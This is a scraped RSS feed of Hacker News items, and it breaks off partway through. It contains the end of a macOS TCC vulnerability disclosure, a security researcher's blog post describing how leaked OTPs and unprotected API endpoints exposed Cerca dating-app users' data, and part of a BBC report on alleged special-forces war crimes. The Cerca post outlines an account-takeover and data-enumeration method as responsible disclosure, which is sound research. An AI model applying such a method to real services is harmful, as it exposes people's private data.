          <td>I notice the status is shown as <q>reproduced</q>, so I follow-up, summarizing all of my previous ramblings</td>
        </tr>
        <tr>
          <td><time datetime="2024-05-16">2024-05-16</time></td>
          <td>Apple Product Security thanks me and reminds me not to disclose the info during their investigation</td>
        </tr>
        <tr>
          <td><time datetime="2024-05-30">2024-05-30</time></td>
          <td>I reach out again, asking for an update on the investigation and my report</td>
        </tr>
        <tr>
          <td><time datetime="2024-05-30">2024-05-30</time></td>
          <td>Apple Product Security replies, saying they are still investigating, and reminds me again to not disclose</td>
        </tr>
        <tr>
          <td><time datetime="2024-06-28">2024-06-28</time></td>
          <td>I reach out again, asking for an update on the investigation and my report</td>
        </tr>
        <tr>
          <td><time datetime="2024-06-28">2024-06-28</time></td>
          <td>Apple Product Security replies, saying there is no update and that they are still investigating</td>
        </tr>
        <tr>
          <td><time datetime="2024-09-17">2024-09-17</time></td>
          <td>I reach out again, asking for an update, sharing what I believe could be a simple patch for the vulnerability: validating that the two fields refer to the same app</td>
        </tr>
        <tr>
          <td><time datetime="2024-09-17">2024-09-17</time></td>
          <td>Apple Product Security replies, saying they are still investigating</td>
        </tr>
        <tr>
          <td><time datetime="2024-12-09">2024-12-09</time></td>
          <td>I reach out again, asking for an update, reiterating my proposed simple patch</td>
        </tr>
        <tr>
          <td><time datetime="2024-12-09">2024-12-09</time></td>
          <td>Apple Product Security replies, saying they are still investigating and that they appreciate my patience</td>
        </tr>
        <tr>
          <td><time datetime="2025-02-28">2025-02-28</time></td>
          <td>I notice there is now an estimated timeframe for a patch, and comment appreciatively</td>
        </tr>
        <tr>
          <td><time datetime="2025-03-03">2025-03-03</time></td>
          <td>Apple Product Security replies thankfully</td>
        </tr>
        <tr>
          <td><time datetime="2025-05-02">2025-05-02</time></td>
          <td>Apple Product Security asks me what name I would like to be credited under</td>
        </tr>
        <tr>
          <td><time datetime="2025-05-02">2025-05-02</time></td>
          <td>I provide my response</td>
        </tr>
        <tr>
          <td><time datetime="2025-05-05">2025-05-05</time></td>
          <td>Apple confirms that I will be credited</td>
        </tr>
        <tr>
          <td><time datetime="2025-05-12">2025-05-12</time></td>
          <td>The patch is released</td>
        </tr>
      </tbody>
    </table>
    <h2>Conclusion</h2>
    <h3>Miscellaneous Additions</h3>
    <p>For those wondering, yes TCC is the system behind the <q>Privacy &amp; Security</q> pane (renamed from <q>Security &amp; Privacy</q>) in the System Settings app. More specifically, the Apple-Events-related consent results appear under the <q>Automation</q> section. The <q>Privacy &amp; Security</q> pane, as a whole, provides a GUI allowing for users to review the consent they have given and (often) allowing them to revoke specific consent responses.</p>
    <p>Something ironic that I found is that if an attacker was able to successfully trick a user into allowing it to send Apple Events, the consent result would not appear in System Settings. This would make it so the user would be unable to revoke their consent through the GUI. There is a (fairly undocumented) <abbr title="command line interface">CLI</abbr> tool called <code>tccutil</code> they could use to revoke their consent, but I doubt most users know about it. I've only found it documented by Apple in two places: <a href="https://developer.apple.com/library/archive/qa/qa1906/_index.html">an old Technical Q&amp;A</a> and <a href="https://it-training.apple.com/tutorials/support/sup125/">an IT training page.</a></p>
    <p>On another note, <a href="https://objective-see.org/blog/blog_0x7F.html">Apple's Endpoint Security framework recently added support for monitoring modifications to the TCC database.</a> If it works as expected, an app using the framework could provide users with the ability to recognize spoofed prompts by, at the very least, notifying them immediately after the fact which app they <em>actually</em> just gave their consent to. That is, if it's being used in the small window between when Apple implemented these events in their Endpoint Security framework and when they patched this vulnerability.</p>
    <h3>Apple's Fix</h3>
    <p>So, what was Apple's fix? To be honest, I'm not entirely sure. When writing this section originally, I downloaded the macOS Sequoia 15.5 RC update file, extracted the <code>tccd</code> binary from it, and performed some brief static analysis to determine what had changed. I came away with a theory of what it was doing at runtime, but I waited for the final release to confirm. It turns out that my original theory was wrong, and the patch Apple had made was quite a bit more complex. Looking closer, it appears they have addressed several issues with the original vulnerability. Not only can an app no longer spoof a TCC prompt in this way, the ability to simply specify an empty string for the indirect object appears similarly hampered.</p>
    <p>Ultimately, it appears these types of messages are now silently dropped by <code>tccd</code> and no action is taken. I'll probably end up looking through the patch more in order to fully understand it (and I wouldn't be surprised if others do as well), but from some brief probing I have done post-update it does seem to be a good patch. If it's not, I'm sure you'll see another update from me or whoever else finds their way around it at some point in the future. If there is something Apple missed, hopefully it doesn't take them another year to patch it!</p>
    <h3>Final Thoughts</h3>
    <p>If there's anything I've learned through security research, it's that if I want this vulnerability to pop I should give it a fancy name. I'm not really creative person, so I'll just pick the first thing that comes to my head.</p>
    <p>I'll call this vulnerability: <q>TCC, Who?</q>.</p>
    <p>As always… <a target="_self" href="https://wts.dev/feed.xml">watch this space.</a></p>
  </article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[HealthBench (120 pts)]]></title>
            <link>https://openai.com/index/healthbench/</link>
            <guid>43965608</guid>
            <pubDate>Mon, 12 May 2025 17:42:37 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://openai.com/index/healthbench/">https://openai.com/index/healthbench/</a>, See on <a href="https://news.ycombinator.com/item?id=43965608">Hacker News</a></p>
Couldn't get https://openai.com/index/healthbench/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[I hacked a dating app (and how not to treat a security researcher) (441 pts)]]></title>
            <link>https://alexschapiro.com/blog/security/vulnerability/2025/04/21/startups-need-to-take-security-seriously</link>
            <guid>43964937</guid>
            <pubDate>Mon, 12 May 2025 16:39:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://alexschapiro.com/blog/security/vulnerability/2025/04/21/startups-need-to-take-security-seriously">https://alexschapiro.com/blog/security/vulnerability/2025/04/21/startups-need-to-take-security-seriously</a>, See on <a href="https://news.ycombinator.com/item?id=43964937">Hacker News</a></p>
<div id="readability-page-1" class="page"><div aria-label="Content">
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><strong>Startups Need to Take Security Seriously</strong></p>

<p><em><strong>Timeline &amp; Responsible Disclosure</strong>: Upon identifying these vulnerabilities, I reached out to the Cerca team via email on <strong>February 23, 2025</strong>. The next day (<strong>Feb 24</strong>), we held a productive video call to discuss the vulnerabilities, potential mitigations, and next steps. During our conversation, the Cerca team acknowledged the seriousness of these issues, expressed gratitude for the responsible disclosure, and assured me they would promptly address the vulnerabilities and inform affected users.</em></p>

<p><em>Since then, I have reached out multiple times (on <strong>March 5</strong> and <strong>March 13</strong>) seeking updates on remediation and user notification plans. Unfortunately, as of today’s publication date (<strong>April&nbsp;21,&nbsp;2025</strong>), I have been met with radio silence. To my knowledge, Cerca has not publicly acknowledged this incident or informed users about this vulnerability, despite their earlier assurances to me. They also never followed up with me following our call and ignored all my follow up emails.</em></p>

<p><em>However, I was able to independently confirm that the vulnerabilities detailed in this blog post have since been patched,  enabling me to responsibly publish these findings.</em></p>

<p>Too few people know how to make secure apps – and the rush to market puts consumers at risk. Some of my friends were saying that they’d gotten texts from this new dating app called Cerca. Obviously, dating apps require a lot of personal information, so I wanted to make sure that my friends’ data was safe before they started using this app.</p>

<p><img src="https://alexschapiro.com/blog/assets/images/cerca-security/introtext.jpg" alt="Text telling users to download Cerca"></p>

<p>I downloaded the app and booted up <a href="https://en.wikipedia.org/wiki/Charles_Proxy">Charles Proxy</a> (using the iPhone app) to intercept the network requests and see what this app was doing under the hood.</p>

<p>First things first, let’s log in. They only use OTP-based sign in (just text a code to your phone number), so I went to check the response from triggering the one-time password. <strong>BOOM</strong> – the OTP is directly in the response, meaning anyone’s account can be accessed with just their phone number.</p>

<p><img src="https://alexschapiro.com/blog/assets/images/cerca-security/otpresponse.png" alt="Screenshot of OTP response revealing the one-time password vulnerability"></p>

<p>However, I now needed to figure out a way to determine who has an account—I don’t just want to guess phone numbers. So I went to the <code>api.cercadating.com</code> endpoint and used a <a href="https://en.wikipedia.org/wiki/Fuzzing">directory fuzzer</a> to enumerate paths, hoping to find relevant endpoints. I couldn’t access any part of the site without the relevant app header:</p>

<p><img src="https://alexschapiro.com/blog/assets/images/cerca-security/app-version.png" alt="App version information required by the API"></p>

<p>So I passed that header through using <a href="https://github.com/OJ/gobuster">Gobuster</a> and to my (semi) surprise all endpoints were exposed, thanks to finding the <code>/docs</code> endpoint which served <code>openapi.json</code>!</p>

<p><img src="https://alexschapiro.com/blog/assets/images/cerca-security/gobusterdocs.png" alt="Screenshot of the found /docs endpoint fro Gobuster"></p>

<p>I powered up Burp Suite and used the match-and-replace tools to always pass that app-version header, along with the bearer token I extracted from Charles proxy. Here is where it gets even more interesting.</p>

<p><img src="https://alexschapiro.com/blog/assets/images/cerca-security/allendpoints.png" alt="Screenshot showing all API endpoints exposed"></p>

<p>Some unprotected endpoints seemed to affect only business logic—such as this one I could use to force two people to match with each other:</p>

<p><img src="https://alexschapiro.com/blog/assets/images/cerca-security/matchendpoint.png" alt="Screenshot of the match endpoint used to force user matches"></p>

<p>But others, like the get user profile endpoint (<code>user/{user_id}</code>), seemed more interesting. This endpoint takes a valid user ID and returns all sorts of personal information (including the phone numbers necessary for total account takeover, thanks to the OTP vulnerability). I wrote a quick Python script to figure out valid user IDs, and then <strong>BANG</strong> – I’m in. I could enumerate over all users; the response format looked something like this:</p>

<div><pre><code><span>{</span><span>

  </span><span>"status"</span><span>:</span><span> </span><span>"success"</span><span>,</span><span>

  </span><span>"message"</span><span>:</span><span> </span><span>"string"</span><span>,</span><span>

  </span><span>"results"</span><span>:</span><span> </span><span>0</span><span>,</span><span>

  </span><span>"data"</span><span>:</span><span> </span><span>{</span><span>

    </span><span>"first_name"</span><span>:</span><span> </span><span>"string"</span><span>,</span><span>

    </span><span>"last_name"</span><span>:</span><span> </span><span>"string"</span><span>,</span><span>

    </span><span>"gender"</span><span>:</span><span> </span><span>"MALE"</span><span>,</span><span>

    </span><span>"interested_genders"</span><span>:</span><span> </span><span>[</span><span>

      </span><span>"MALE"</span><span>

    </span><span>],</span><span>

    </span><span>"city"</span><span>:</span><span> </span><span>"string"</span><span>,</span><span>

    </span><span>"latitude"</span><span>:</span><span> </span><span>0</span><span>,</span><span>

    </span><span>"longitude"</span><span>:</span><span> </span><span>0</span><span>,</span><span>

    </span><span>"university_email"</span><span>:</span><span> </span><span>"<a href="https://alexschapiro.com/cdn-cgi/l/email-protection" data-cfemail="83f6f0e6f1c3e6fbe2eef3efe6ade0ecee">[email&nbsp;protected]</a>"</span><span>,</span><span>

    </span><span>"university_email_verified"</span><span>:</span><span> </span><span>false</span><span>,</span><span>

    </span><span>"industry"</span><span>:</span><span> </span><span>"string"</span><span>,</span><span>

    </span><span>"profession"</span><span>:</span><span> </span><span>"string"</span><span>,</span><span>

    </span><span>"date_of_birth"</span><span>:</span><span> </span><span>"2025-02-21"</span><span>,</span><span>

    </span><span>"height"</span><span>:</span><span> </span><span>0</span><span>,</span><span>

    </span><span>"university_id"</span><span>:</span><span> </span><span>0</span><span>,</span><span>

    </span><span>"university_name"</span><span>:</span><span> </span><span>"string"</span><span>,</span><span>

    </span><span>"profile_completed"</span><span>:</span><span> </span><span>false</span><span>,</span><span>

    </span><span>"national_id_verified"</span><span>:</span><span> </span><span>false</span><span>,</span><span>

    </span><span>"mobile_verified"</span><span>:</span><span> </span><span>false</span><span>,</span><span>

    </span><span>"email_verified"</span><span>:</span><span> </span><span>false</span><span>,</span><span>

    </span><span>"premium"</span><span>:</span><span> </span><span>false</span><span>,</span><span>

    </span><span>"premium_expiry"</span><span>:</span><span> </span><span>"2025-02-21T21:31:06.213Z"</span><span>,</span><span>

    </span><span>"active"</span><span>:</span><span> </span><span>true</span><span>,</span><span>

    </span><span>"paused"</span><span>:</span><span> </span><span>false</span><span>,</span><span>

    </span><span>"onboarded"</span><span>:</span><span> </span><span>false</span><span>,</span><span>

    </span><span>"profile_type"</span><span>:</span><span> </span><span>"PROFESHIONAL"</span><span>,</span><span>

    </span><span>"mobile_number"</span><span>:</span><span> </span><span>"string"</span><span>,</span><span>

    </span><span>"email"</span><span>:</span><span> </span><span>"<a href="https://alexschapiro.com/cdn-cgi/l/email-protection" data-cfemail="2d585e485f6d48554c405d4148034e4240">[email&nbsp;protected]</a>"</span><span>,</span><span>

    </span><span>"user_type"</span><span>:</span><span> </span><span>[</span><span>

      </span><span>"user"</span><span>

    </span><span>],</span><span>

    </span><span>"user_id"</span><span>:</span><span> </span><span>0</span><span>,</span><span>

    </span><span>"remaining_searches"</span><span>:</span><span> </span><span>0</span><span>,</span><span>

    </span><span>"profile_images"</span><span>:</span><span> </span><span>[],</span><span>

    </span><span>"university"</span><span>:</span><span> </span><span>{</span><span>

      </span><span>"id"</span><span>:</span><span> </span><span>0</span><span>,</span><span>

      </span><span>"name"</span><span>:</span><span> </span><span>"string"</span><span>

    </span><span>},</span><span>

    </span><span>"score"</span><span>:</span><span> </span><span>[],</span><span>

    </span><span>"match_preferences"</span><span>:</span><span> </span><span>[],</span><span>

    </span><span>"user_prompts"</span><span>:</span><span> </span><span>[],</span><span>

    </span><span>"mutual_contact_previews"</span><span>:</span><span> </span><span>[],</span><span>

    </span><span>"mutual_contact_preview_data"</span><span>:</span><span> </span><span>[],</span><span>

    </span><span>"mutual_contact_count"</span><span>:</span><span> </span><span>0</span><span>,</span><span>

    </span><span>"created_at"</span><span>:</span><span> </span><span>"2025-02-21T21:31:06.213Z"</span><span>,</span><span>

    </span><span>"updated_at"</span><span>:</span><span> </span><span>"2025-02-21T21:31:06.213Z"</span><span>,</span><span>

    </span><span>"zodiac_info"</span><span>:</span><span> </span><span>{},</span><span>

    </span><span>"distance_km"</span><span>:</span><span> </span><span>0</span><span>,</span><span>

    </span><span>"final_score"</span><span>:</span><span> </span><span>0</span><span>,</span><span>

    </span><span>"age"</span><span>:</span><span> </span><span>0</span><span>

  </span><span>},</span><span>

  </span><span>"meta"</span><span>:</span><span> </span><span>{}</span><span>

</span><span>}</span><span>
</span></code></pre></div>

<p>Now not only could I figure out all valid phone numbers linked to an account (which can then be taken over using the OTP misconfiguration), but all of this PII is out there without OTP sign in needed! But it gets worse – the <code>national_id_verified</code> field seems especially concerning. Sure enough, they store your passport or ID information in the system too, like this:</p>

<p><img src="https://alexschapiro.com/blog/assets/images/cerca-security/idendpoint.png" alt="Screenshot of the user profile (ID) endpoint returning personal data"></p>
<div><pre><code><span>{</span><span>

  </span><span>"status"</span><span>:</span><span> </span><span>"success"</span><span>,</span><span>

  </span><span>"message"</span><span>:</span><span> </span><span>"string"</span><span>,</span><span>

  </span><span>"results"</span><span>:</span><span> </span><span>0</span><span>,</span><span>

  </span><span>"data"</span><span>:</span><span> </span><span>{</span><span>

    </span><span>"verification_type"</span><span>:</span><span> </span><span>"PASSPORT"</span><span>,</span><span>

    </span><span>"document_number"</span><span>:</span><span> </span><span>"string"</span><span>,</span><span>

    </span><span>"front_side_url"</span><span>:</span><span> </span><span>"string"</span><span>,</span><span>

    </span><span>"back_side_url"</span><span>:</span><span> </span><span>"string"</span><span>,</span><span>

    </span><span>"selfie_url"</span><span>:</span><span> </span><span>"string"</span><span>,</span><span>

    </span><span>"status"</span><span>:</span><span> </span><span>"pending"</span><span>,</span><span>

    </span><span>"id"</span><span>:</span><span> </span><span>0</span><span>,</span><span>

    </span><span>"user_id"</span><span>:</span><span> </span><span>0</span><span>

  </span><span>},</span><span>

  </span><span>"meta"</span><span>:</span><span> </span><span>{}</span><span>

</span><span>}</span><span>
</span></code></pre></div>
<p>This is only available to the signed-in user, but since I could sign in as any user, I could see anyone’s ID information if they had submitted it (again, I did not do this). Not only could I see <strong>anyone’s personal messages with potential dates</strong>, I may be able to see their <strong>passport information</strong>! I ran a quick script to see how many users I could get information about, how many were registered as Yale students (I assume more were Yale students and maybe just didn’t fill in their university), and how many users had input their ID information. The script basically just counted how many valid users it saw; if after 1,000 consecutive IDs it found none, then it stopped. So there could be more out there (Cerca themselves claimed 10k users in the first week), but I was able to find 6,117 users, 207 who had put their ID information in, and 19 who claimed to be Yale students.</p>

<p><img src="https://alexschapiro.com/blog/assets/images/cerca-security/scanresults.png" alt="Screenshot of the script output showing the number of users, Yale students, and users with ID information"> <img src="https://alexschapiro.com/blog/assets/images/cerca-security/cercaselfstats.png" alt="Screenshot of Cerca's instagram post claiming 10k users in the first week"></p>

<p>This is an insane leak!! I have access to <strong>sexual preferences, intimate messages, and all sorts of PII from (according to Cerca themselves) tens of thousands of unsuspecting users</strong>. Cerca, in their privacy policy, says that “We use encryption and other industry-standard measures to protect your data,” but that is clearly misleading. This poses significant risks to user safety and privacy. Considering that I’m just a college student looking at this casually, it’s entirely possible other critical vulnerabilities may exist (though complete account takeover sets a pretty high bar).</p>

<p>The fallout from this vulnerability is a complete invasion of privacy with potentially very harmful real-world consequences. People need to learn how to make secure apps, and not claim their apps are safe when they aren’t. Especially for a dating app! You can’t expect all users to do the checking that I did in this article. Who knows how many people already had access to all this data before I found it? Someone out there could’ve already downloaded a full database of 6,000+ users’ personal info and intimate chats, ready to exploit it. If someone with malicious intent got their hands on this info it could lead to identity theft, stalking, blackmail – you name it. These types of vulnerabilities are really scary, <strong>they can ruin lives overnight</strong>. People need to prioritize securing user data, not just shipping an app they think can go viral. And I did not set out to find this vulnerability to write this blog post, but since Cerca has not responded to any of my mails since our call nor alerted any of their users, I thought that this was a fair post to publish. Not looking to pwn anyone, just want a safer internet!</p>

  </div>
</article>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Ex-UK Special Forces break silence on 'war crimes' by colleagues (117 pts)]]></title>
            <link>https://www.bbc.com/news/articles/cj3j5gxgz0do</link>
            <guid>43964885</guid>
            <pubDate>Mon, 12 May 2025 16:34:35 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.bbc.com/news/articles/cj3j5gxgz0do">https://www.bbc.com/news/articles/cj3j5gxgz0do</a>, See on <a href="https://news.ycombinator.com/item?id=43964885">Hacker News</a></p>
<div id="readability-page-1" class="page"><article><p data-component="headline-block"><h2>Ex-UK Special Forces break silence on 'war crimes' by colleagues</h2></p><div data-testid="byline-new" data-component="byline-block"><p><span>Hannah O'Grady, Joel Gunter &amp; Rory Tinman</span></p><p><span>BBC Panorama</span></p></div><p data-component="caption-block"><figcaption>A video compiled by UK Special Forces shows how members of one squadron kept count of their kills</figcaption></p><div data-component="text-block"><p>Former members of UK Special Forces have broken years of silence to give BBC Panorama eyewitness accounts of alleged war crimes committed by colleagues in Iraq and Afghanistan.</p><p>Giving their accounts publicly for the first time, the veterans described seeing members of the SAS murder unarmed people in their sleep and execute handcuffed detainees, including children.</p><p>"They handcuffed a young boy and shot him," recalled one veteran who served with the SAS in Afghanistan. "He was clearly a child, not even close to fighting age."</p><p>Killing of detainees "became routine", the veteran said. "They'd search someone, handcuff them, then shoot them", before cutting off the plastic handcuffs used to restrain people and "planting a pistol" by the body, he said.</p><p>The new testimony includes allegations of war crimes stretching over more than a decade, far longer than the three years currently being examined by a judge-led public inquiry in the UK.</p><p>The SBS, the Royal Navy's elite special forces regiment, is also implicated for the first time in the most serious allegations - executions of unarmed and wounded people.</p><p>A veteran who served with the SBS said some troops had a "mob mentality", describing their behaviour on operations as "barbaric".</p><p>"I saw the quietest guys switch, show serious psychopathic traits," he said.  "They were lawless. They felt untouchable."</p><p>Special Forces were deployed to Afghanistan to protect British troops from Taliban fighters and bombmakers. The conflict was a deadly one for members of the UK's armed forces – 457 lost their lives and thousands more were wounded.</p><p>Asked by the BBC about the new eyewitness testimony, the Ministry of Defence said that it was "fully committed" to supporting the ongoing public inquiry into the alleged war crimes and that it urged all veterans with relevant information to come forward. It said that it was "not appropriate for the MoD to comment on allegations" which may be in the inquiry's scope.</p></div><p data-component="subheadline-block"><h2>'Psychotic murderers' in the regiment</h2></p><div data-component="text-block"><p>The eyewitness testimony offers the most detailed public account of the killings to date from former members of UK Special Forces (UKSF), the umbrella group which contains the SAS, SBS and several supporting regiments.</p><p>The testimony, from more than 30 people who served with or alongside UK Special Forces, builds on years of reporting by BBC Panorama into allegations of extrajudicial killings by the SAS.</p><p>Panorama can also reveal for the first time that then Prime Minister David Cameron was repeatedly warned during his tenure that UK Special Forces were killing civilians in Afghanistan.</p><p>Speaking on condition of anonymity because of a de facto code of silence around special forces operations, the eyewitnesses told the BBC that the laws of war were being regularly and intentionally broken by the country's most elite regiments during operations in both Iraq and Afghanistan.</p><p>Those laws state that on such operations people can be deliberately killed only when they pose a direct threat to the lives of British troops or others. But members of the SAS and SBS were making their own rules, the eyewitnesses said.</p><p>"If a target had popped up on the list two or three times before, then we'd go in with the intention of killing them, there was no attempt to capture them," said one veteran who served with the SAS, referring to people who had been previously captured, questioned and then released.</p><p>"Sometimes we'd check we'd identified the target, confirm their ID, then shoot them," he said. "Often the squadron would just go and kill all the men they found there."</p><p>One witness who served with the SAS said that killing could become "an addictive thing to do" and that some members of the elite regiment were "intoxicated by that feeling" in Afghanistan. There were "lots of psychotic murderers", he said.</p></div><figure><div data-component="image-block"><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20250428-123652-7bc49a8f4-web-2.20.1-1/grey-placeholder.png"><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/3056/live/a6b669b0-2cc4-11f0-a654-3fbec6ba11e7.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/3056/live/a6b669b0-2cc4-11f0-a654-3fbec6ba11e7.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/3056/live/a6b669b0-2cc4-11f0-a654-3fbec6ba11e7.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/3056/live/a6b669b0-2cc4-11f0-a654-3fbec6ba11e7.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/3056/live/a6b669b0-2cc4-11f0-a654-3fbec6ba11e7.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/3056/live/a6b669b0-2cc4-11f0-a654-3fbec6ba11e7.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/3056/live/a6b669b0-2cc4-11f0-a654-3fbec6ba11e7.jpg.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/3056/live/a6b669b0-2cc4-11f0-a654-3fbec6ba11e7.jpg.webp" loading="eager" alt="Getty Images A meeting at Downing Street in 2011 between UK Prime Minister David Cameron, wearing a dark suit and tie, and Afghan President Hamid Karzai, who is wearing a dark suit and shirt and an embroidered chapan, an Afghan coat or cape, with purple and green stripes. They are shaking hands as they stand in front of a marble fireplace and paintings in gilded frames"><span>Getty Images</span></p></div><p data-component="caption-block"><figcaption>Then Prime Minister David Cameron (r) was made aware, by the then Afghan President Hamid Karzai (l), of allegations of civilian killings, the BBC has been told</figcaption></p></figure><div data-component="text-block"><p>"On some operations, the troop would go into guesthouse-type buildings and kill everyone there," he said. "They'd go in and shoot everyone sleeping there, on entry. It's not justified, killing people in their sleep."</p><p>A veteran who served with the SBS told the BBC that after bringing an area under control, assault teams would sweep through the area shooting anyone on the ground, checking the bodies and killing anyone left alive. "It was expected, not hidden. Everyone knew," he said.</p><p>Intentionally killing wounded people who do not pose a threat would be a clear breach of international law. But the SBS veteran told Panorama that wounded people were routinely killed. He described one operation during which a medic was treating someone who had been shot but was still breathing. "Then one of our blokes came up to him. There was a bang. He'd been shot in the head at point-blank range," he said.</p><p>The killings were "completely unnecessary," he added. "These are not mercy killings. It's murder."</p></div><div data-component="text-block"><p>More junior members of assault teams were told by more senior SAS operators to kill male detainees, according to the testimony, using instructions such as "he's not coming back to base with us" or "this detainee, you make sure he doesn't come off target".</p><p>Detainees were people who had surrendered, been searched by special forces, and were typically handcuffed. British and international law forbid troops from deliberately killing unarmed civilians or prisoners of war.</p><p>A former SAS operator also described learning of an operation in Iraq during which someone was executed.</p><p>"It was pretty clear from what I could glean that he posed no threat, he wasn't armed. It's disgraceful. There's no professionalism in that," the former operator said. The killing was never properly investigated, he added. According to the SAS veteran, the problem started long before the regiment moved across to Afghanistan and "senior commanders were aware of that".</p></div><figure><div data-component="image-block"><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20250428-123652-7bc49a8f4-web-2.20.1-1/grey-placeholder.png"><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/8cd6/live/be96f6f0-2cdb-11f0-992a-53cdd61a1eb7.png.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/8cd6/live/be96f6f0-2cdb-11f0-992a-53cdd61a1eb7.png.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/8cd6/live/be96f6f0-2cdb-11f0-992a-53cdd61a1eb7.png.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/8cd6/live/be96f6f0-2cdb-11f0-992a-53cdd61a1eb7.png.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/8cd6/live/be96f6f0-2cdb-11f0-992a-53cdd61a1eb7.png.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/8cd6/live/be96f6f0-2cdb-11f0-992a-53cdd61a1eb7.png.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/8cd6/live/be96f6f0-2cdb-11f0-992a-53cdd61a1eb7.png.webp 1536w" src="https://ichef.bbci.co.uk/news/480/cpsprodpb/8cd6/live/be96f6f0-2cdb-11f0-992a-53cdd61a1eb7.png.webp" loading="lazy" alt="A night-vision image of troops firing their weapons in a desert landscape"></p></div><p data-component="caption-block"><figcaption>One SAS veteran said that killing could be an "addictive thing to do"</figcaption></p></figure><div data-component="text-block"><p>The testimony, as well as new video evidence obtained by the BBC from SAS operations in Iraq in 2006, also supports previous reporting by Panorama that SAS squadrons kept count of their kills to compete with one another.</p><p>Sources told the BBC that some members of the SAS kept their own individual counts, and that one operator personally killed dozens of people on one six-month tour of Afghanistan.</p><p>"It seemed like he was trying to get a kill on every operation, every night someone got killed," a former colleague said. The operator was "notorious in the squadron, he genuinely seemed like a psychopath," the former colleague added.</p><p>In one incident that sources say became infamous inside the SAS, the operator allegedly slit the throat of an injured Afghan man after telling an officer not to shoot the man again. It was "because he wanted to go and finish the wounded guy off with his knife," another former colleague said. "He wanted to, you know, blood his knife."</p></div><div data-component="text-block"><ul><li><a target="_self" href="https://www.bbc.co.uk/news/articles/cp3q5xl9wqwo">Top UK Special Forces general oversaw blocking of Afghan 'war-crime' witnesses to Britain</a></li></ul></div><div data-component="text-block"><p>Knowledge of the alleged crimes was not confined to small teams or individual squadrons, according to the testimony. Within the UK Special Forces command structure, "everyone knew" what was happening, said one veteran.</p><p>"I'm not taking away from personal responsibility, but everyone knew," he said. "There was implicit approval for what was happening."</p><p>To avoid scrutiny of the killings, eyewitnesses said, members of the SAS and SBS would plant so-called "drop weapons" on the bodies of the dead, to make it look as though they had been armed in the photographs routinely taken by special forces teams at the scene.</p><p>"There was a fake grenade they'd take with them onto target, it couldn't detonate," said a former SAS operator. Another veteran said operators would carry AK-47 rifles which had a folding stock because they were easier to fit into their rucksacks and "easier to bring onto a target and plant by a body".</p></div><p data-component="subheadline-block"><h2>Reports were 'fiction'</h2></p><div data-component="text-block"><p>Officers would then help to falsify post-operational reports in order to avoid scrutiny for the actions of assault teams on the ground, according to the testimony.</p><p>"We understood how to write up serious incident reviews so they wouldn't trigger a referral to the military police," one of the veterans said.</p><p>"If it looked like a shooting could represent a breach of the rules of conflict, you'd get a phone call from the legal adviser or one of the staff officers in HQ. They'd pick you up on it and help you to clarify the language. 'Do you remember someone making a sudden move?' 'Oh yeah, I do now.' That sort of thing. It was built into the way we operated."</p><p>The reports were "a fiction", another UKSF veteran said.</p><p>An intelligence officer who worked with the SBS described reports which said they had been caught in a firefight, while the photos showed bodies with "multiple clean headshots".</p><p>Falsified paperwork could help prevent an investigation by the Royal Military Police, but British special forces operations generated deep concern from Afghan commanders and Afghan government officials.</p><p>David Cameron - who made seven visits to Afghanistan as prime minister between June 2010 and November 2013, the period now under scrutiny by the SAS public inquiry, was repeatedly made aware of the concerns by Afghan President Hamid Karzai, according to multiple people who attended the meetings.</p><p>Mr Karzai "consistently, repeatedly mentioned this issue", former Afghan national security adviser Dr Rangin Dadfar Spanta told Panorama. He said Lord Cameron could have been left in no doubt that there were allegations of civilians, including children, being killed during operations carried out by UK Special Forces.</p></div><figure><div data-component="image-block"><p><img src="https://static.files.bbci.co.uk/bbcdotcom/web/20250428-123652-7bc49a8f4-web-2.20.1-1/grey-placeholder.png"><img sizes="(min-width: 1280px) 50vw, (min-width: 1008px) 66vw, 96vw" srcset="https://ichef.bbci.co.uk/news/240/cpsprodpb/539a/live/c77020c0-2ce6-11f0-8ff1-59f5dcf8e9f5.jpg.webp 240w,https://ichef.bbci.co.uk/news/320/cpsprodpb/539a/live/c77020c0-2ce6-11f0-8ff1-59f5dcf8e9f5.jpg.webp 320w,https://ichef.bbci.co.uk/news/480/cpsprodpb/539a/live/c77020c0-2ce6-11f0-8ff1-59f5dcf8e9f5.jpg.webp 480w,https://ichef.bbci.co.uk/news/640/cpsprodpb/539a/live/c77020c0-2ce6-11f0-8ff1-59f5dcf8e9f5.jpg.webp 640w,https://ichef.bbci.co.uk/news/800/cpsprodpb/539a/live/c77020c0-2ce6-11f0-8ff1-59f5dcf8e9f5.jpg.webp 800w,https://ichef.bbci.co.uk/news/1024/cpsprodpb/539a/live/c77020c0-2ce6-11f0-8ff1-59f5dcf8e9f5.jpg.webp 1024w,https://ichef.bbci.co.uk/news/1536/cpsprodpb/539a/live/c77020c0-2ce6-11f0-8ff1-59f5dcf8e9f5.jpg.webp 1536w" 